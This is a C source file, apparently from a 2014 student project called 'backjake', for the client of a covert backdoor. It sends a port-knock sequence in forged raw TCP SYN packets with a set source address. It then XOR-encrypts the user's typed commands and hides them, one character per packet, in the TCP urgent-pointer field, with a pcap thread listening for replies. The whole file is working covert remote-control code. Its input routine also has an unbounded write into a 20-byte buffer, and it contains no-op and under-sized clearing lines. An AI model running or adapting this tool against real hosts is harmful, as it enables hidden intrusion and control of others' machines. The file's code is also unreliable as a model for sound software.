#include "backjake.h"

// Function Prototypes
//void* SendDatagram (void *addr_ptr);
void * addr_ptr;

/*------------------------------------------------------------------------------
--
--  FUNCTION:   client
--
--  DATE:       October 5th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void client(void * Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
--                          Addr_Ptr    - a pointer to the address structure
--                          pcap_ptr    - pointer to the pcap structure
--                          ThreadID2   - the id of the thread for recieving 
--
--  RETURNS:    void
--
--  NOTES:      the main client code
--  
------------------------------------------------------------------------------*/
void client(void * Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
{
    char command[20] = {0};
    memset(command, 0, sizeof(command));
    addr_ptr = Addr_Ptr;

    pthread_create (ThreadID2, NULL, recvThread, (void *)pcap_ptr);
    sendKnockCode(Addr_Ptr); // read and send the knock code

    while(1)
    {
        if (getCommand(command))
        {
            XOR(command);  // read the user command, thenencrypt the command
            sendCommand(Addr_Ptr, command); // send the command
        } else {
            exit(1);
        }
    }
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendKnockCode
--
--  DATE:       October 5th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void sendKnockCode(void * Addr_Ptr)
--                          Addr_Ptr     - a pointer to the address structure
--
--  RETURNS:    void
--
--  NOTES:      reads the knock code, and sends it to the server
--  
------------------------------------------------------------------------------*/
void sendKnockCode(void * Addr_Ptr)
{
    size_t m = 0;
    size_t len = sizeof(knockCode) / sizeof(knockCode[0]);
    
    for (m = 0; m < len; m++)
    {
        printf("%d ", knockCode[m]);
        forgeKnock(knockCode[m], Addr_Ptr);
    }
    printf("\n");
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   forgeKnock
--
--  DATE:       October 5th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void forgeKnock(int knock, void * addr_ptr)
--                          knock     - the port to knock on
--                          addr_ptr  - a pointer to the address structure
--
--  RETURNS:    void
--
--  NOTES:      uses raw sockets to build the knock packet
--  
------------------------------------------------------------------------------*/
void forgeKnock(int knock, void * addr_ptr)
{
    char datagram[PKT_SIZE];    // set the Datagram (packet) size
    struct iphdr *iph = (struct iphdr *) datagram;   //IP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));    //TCP header
    struct sockaddr_in sin;
    pseudo_header psh;

    AddrInfo *UserAddr = (AddrInfo *)addr_ptr;
    unsigned int iseed = (unsigned int)time(NULL);
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons (UserAddr->dport);
    UserAddr->DstHost = DESTIP;
    sin.sin_addr.s_addr = inet_addr (UserAddr->DstHost); 

    memset (datagram, 0, PKT_SIZE); // zero out the buffer where the datagram will be stored
    
    // Seed the random number generator
    srand (iseed);

    //IP Header Fields
    iph->ihl = 5;       // IP Header Length
    iph->version = 4;       // Version 4
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); // Calculate the total Datagram size
    iph->id = htonl (rand()%65354);     //Random IP Identification Field
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;     // Set the TTL value
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;         //Initialize to zero before calculating checksum
    iph->saddr = inet_addr (UserAddr->SrcHost);  //Source IP address
    iph->daddr = sin.sin_addr.s_addr;
    
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    
    
    //TCP Header Fields
    tcph->source = htons (knock); // TCP source port
    tcph->dest = htons (UserAddr->dport);   // TCP destination port
    tcph->seq = rand()%RAND_MAX;        // Randomized sequence number between 0 and 2^31 -1 
    tcph->ack_seq = 0;
    tcph->doff = 5;      // Data Offset is set to the TCP header length 
    tcph->fin = 0;
    tcph->syn = 1;    // Set the SYN bit
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons (rand()% 4000 + 1024);     // Maximum allowable window size (between 1024 and 5024 Bytes)
    tcph->check = 0;                // Initialize the checksum to zero
                            // The kernel's IP stack will fill in the correct checksum during transmission 
    tcph->urg_ptr = 21;
    
    // calcluate the IP checksum
    psh.source_address = inet_addr(UserAddr->SrcHost);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
    
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
    
    tcph->check = csum( (unsigned short*) &psh , sizeof (pseudo_header));
    
    //IP_HDRINCL to stop the kernel from building the packet headers 
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (UserAddr->RawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            perror ("setsockopt");
    }

    if (sendto (UserAddr->RawSocket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
        perror ("sendto");
        exit (1);
    }
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendCommand
--
--  DATE:       October 5th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void sendCommand(void * addr_ptr, char *command)
--                          addr_ptr  - a pointer to the address structure
--                          command   - the command to send
--
--  RETURNS:    void
--
--  NOTES:      sends the command to the server
--  
------------------------------------------------------------------------------*/
void sendCommand(void * addr_ptr, char *command)
{
    size_t l = 0, size = length(command);

    for(l = 0; l < size+1; l++)
    {
        char datagram[PKT_SIZE];    // set the Datagram (packet) size
        struct iphdr *iph = (struct iphdr *) datagram;   //IP header
        struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));    //TCP header
        struct sockaddr_in sin;
        pseudo_header psh;

        AddrInfo *UserAddr = (AddrInfo *)addr_ptr;
        unsigned int iseed = (unsigned int)time(NULL);
        
        sin.sin_family = AF_INET;
        sin.sin_port = htons (UserAddr->dport);
    
        if (server == CLIENT) // if this is the client
            UserAddr->DstHost = DESTIP; // send to the server
        else
            UserAddr->DstHost = SRCIP; // else if this is the client, send to the server

        sin.sin_addr.s_addr = inet_addr (UserAddr->DstHost); 

        memset (datagram, 0, PKT_SIZE); // zero out the buffer where the datagram will be stored
        
        // Seed the random number generator
        srand (iseed);

        //IP Header Fields
        iph->ihl = 5;       // IP Header Length
        iph->version = 4;       // Version 4
        iph->tos = 0;
        iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); // Calculate the total Datagram size
        iph->id = htonl (rand()%65354);     //Random IP Identification Field
        iph->frag_off = 0;
        iph->ttl = DEFAULT_TTL;     // Set the TTL value
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;         //Initialize to zero before calculating checksum
        iph->saddr = inet_addr (UserAddr->SrcHost);  //Source IP address
        iph->daddr = sin.sin_addr.s_addr;
        
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        
        //TCP Header Fields
        tcph->source = htons (UserAddr->sport); // TCP source port
        tcph->dest = htons (UserAddr->dport);   // TCP destination port
        tcph->seq = rand()%RAND_MAX;        // Randomized sequence number between 0 and 2^31 -1 
        tcph->ack_seq = 0;
        tcph->doff = 5;      // Data Offset is set to the TCP header length 
        tcph->fin = 0;
        tcph->syn = 1;    // Set the SYN bit
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 21;
        tcph->window = htons (rand()% 4000 + 1024);     // Maximum allowable window size (between 1024 and 5024 Bytes)
        tcph->check = 0;                // Initialize the checksum to zero
                                // The kernel's IP stack will fill in the correct checksum during transmission 
        if (l == size)
            tcph->urg_ptr = 21;
        else
            tcph->urg_ptr = command[l];

        
        // calcluate the IP checksum
        psh.source_address = inet_addr(UserAddr->SrcHost);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(20);
        
        memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
        
        tcph->check = csum( (unsigned short*) &psh , sizeof (pseudo_header));
        
        //IP_HDRINCL to stop the kernel from building the packet headers 
        {
            int one = 1;
            const int *val = &one;
            if (setsockopt (UserAddr->RawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
                perror ("setsockopt");
        }

        if (sendto (UserAddr->RawSocket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror ("sendto");
            exit (1);
        }
    }

    memset(command, 0, sizeof(command[0]));
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   recvThread
--
--  DATE:       October 5th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void* recvThread(void* pcap_arg)
--                   pcap_arg - the pointer to the pcap structure
--
--  RETURNS:    void* - null, in this case
--
--  NOTES:      a thread for listening on the client side
--  
------------------------------------------------------------------------------*/
void* recvThread(void* pcap_arg)
{
    struct bpf_program fp;
    PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
        
    pcapCompile(pcap_ptr, &fp);
    pcapFilter(pcap_ptr, &fp);
    pcapListen(pcap_ptr);

    return NULL;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   getCommand
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  int getCommand(char * command)
--                command - the string to write the command into 
--
--  RETURNS:    int - returns 1 on success
--
--  NOTES:      gets the user input for the command
--  
------------------------------------------------------------------------------*/
int getCommand(char * command)
{
    while (1) 
    { // skip leading whitespace
        int c = getchar();
        if (c == EOF) 
            break; // end of file
        
        if (!isspace(c))
        {
            ungetc(c, stdin);
            break;
        }
    }

    int i = 0;
    while (1) 
    {
        int c = getchar();
        if (c == '\n' || c == EOF) // at end, add terminating zero
        {
            command[i] = 0;
            break;
        }

        command[i] = c;
        i++;
    }
    command[i] == 59;
    return 1;
}
